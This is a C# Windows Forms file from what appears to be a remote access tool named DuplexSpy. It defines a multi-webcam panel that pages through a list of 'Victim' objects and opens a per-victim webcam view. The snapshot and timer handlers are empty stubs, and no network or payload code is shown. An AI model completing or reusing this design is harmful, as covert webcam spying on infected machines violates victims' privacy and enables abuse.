using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiWebcam : Form
    {
        private int idx_page = 1;
        public List<Victim> l_victim;

        public frmMultiWebcam()
        {
            InitializeComponent();
        }

        private void Req_SnapShot()
        {
            int idx_start = (idx_page - 1) * 9;
            for (int i = 0; i < 9 && i < l_victim.Count; i++)
            {
                PictureBox pb = null;
                Invoke(new Action(() => pb = (PictureBox)tableLayoutPanel1.Controls[i]));

                if (pb.Tag == null)
                    break;

                Victim v = l_victim[idx_start + i];
                
            }
        }

        void setup()
        {
            int idx = 0;
            for (int i = 0; i < tableLayoutPanel1.RowCount; i++)
            {
                for (int j = 0; j < tableLayoutPanel1.ColumnCount; j++)
                {
                    PictureBox pb = new PictureBox()
                    {
                        Dock = DockStyle.Fill,
                        BackColor = Color.Black,
                        SizeMode = PictureBoxSizeMode.Zoom,
                        Tag = idx,
                    };
                    tableLayoutPanel1.Controls.Add(pb, j, i);
                    pb.MouseDoubleClick += pb_MouseDoubleClick;
                    idx++;
                }
            }

            timer1.Start();
        }

        private void frmMultiWebcam_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void pb_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            PictureBox pb = (PictureBox)sender;
            if (pb.Tag != null)
            {
                int idx = (int)pb.Tag;
                int idx_start = (idx_page - 1) * 9;
                frmWebcam f = new frmWebcam();
                f.Tag = Function.Webcam;
                f.v = l_victim[idx + idx_start];
                f.Show();
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        //Start
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            timer1.Start();

        }
        //Stop
        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            timer1.Stop();

        }
        //SnapShot
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            new Thread(() => Req_SnapShot()).Start();
        }

        //Previous Page
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (idx_page - 1 > 0)
                idx_page--;
        }
        //Next Page
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            int idx_start = idx_page * 9;
            if (idx_start <= l_victim.Count)
                idx_page++;
        }
    }
}
